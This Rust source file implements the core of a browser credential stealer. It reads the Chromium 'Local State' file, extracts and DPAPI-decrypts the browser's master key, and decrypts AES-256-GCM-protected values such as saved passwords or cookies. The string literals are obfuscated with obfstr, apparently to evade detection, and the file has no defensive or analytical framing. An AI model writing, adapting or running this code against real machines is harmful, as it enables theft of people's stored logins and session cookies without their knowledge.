#![allow(non_snake_case)]
#![allow(dead_code)]


use std::{
    path::Path,
    io::{Read, Error as IOError},
    fs::File,
    ptr::null_mut,
    slice,
};

use anyhow::{Result, bail};

use regex::Regex;

use obfstr::obfstr;

use base64_light::base64_decode;


#[inline]
pub fn get_master_key_from_Local_State<T>(path: T) -> Result<Vec<u8>>  
where
    T: AsRef<Path>
{
    // please forgive me for writing this shitty code

    #[allow(non_snake_case)]
    #[repr(C)]
    struct CRYPTOAPI_BLOB {
        cbData: u32,
        pbData: *mut u8,
    }

    extern "system" {
        fn CryptUnprotectData(
            pDataIn: *mut CRYPTOAPI_BLOB,
            ppszDataDescr: *mut u16,
            pOptionalEntropy: *mut CRYPTOAPI_BLOB, 
            pvReserved: *mut (),
            pPromptStruct: *mut (),
            dwFlags: u32,
            pDataOut: *mut CRYPTOAPI_BLOB,
        ) -> i32;
    }



    let mut file_content = String::new();
    File::open(path)?.read_to_string(&mut file_content)?;
     
    let raw_key = Regex::new(obfstr!(r#"encrypted_key":"([^"]+)""#)).unwrap()
        .captures_iter(&file_content)
        .nth(0).unwrap()
        .get(1).unwrap()
        .as_str();

    let mut key: Vec<u8> = base64_decode(raw_key)[5..].to_vec();

    let mut data_in = CRYPTOAPI_BLOB {
        cbData: key.len() as u32,
        pbData: key.as_mut_ptr(),
    };
    let mut data_out = CRYPTOAPI_BLOB {
        cbData: 0, 
        pbData: null_mut()
    };

    let fail = unsafe { CryptUnprotectData (
        &mut data_in,
        // &mut data_in as *mut _,
        null_mut(),
        null_mut(),
        null_mut(),
        null_mut(),
        0,
        &mut data_out
        ) == 0 
    }; 
    if fail {
        bail!(IOError::last_os_error());
    }
     
    unsafe { 
        Ok(slice::from_raw_parts(data_out.pbData, data_out.cbData as usize).to_owned()) 
    }
}


#[inline]
pub fn decrypt_aes256gcm(ciphertext: &[u8], key: &[u8]) -> Result<String> {    

    use aes_gcm::{Aes256Gcm, KeyInit, Nonce, aead::Aead};
   
    let cipher = match Aes256Gcm::new_from_slice(key) {
        Ok(value) => value,
        Err(_) => bail!(obfstr!("Invalid Key Lenght (must be 32 bytes)").to_string()),
    };

    let nonce = Nonce::from_slice(&ciphertext[3..15]);
    
    let value: Vec<u8> = cipher.decrypt(nonce, &*ciphertext[15..].as_ref())?;  
      
    Ok(String::from_utf8(value)?)
} 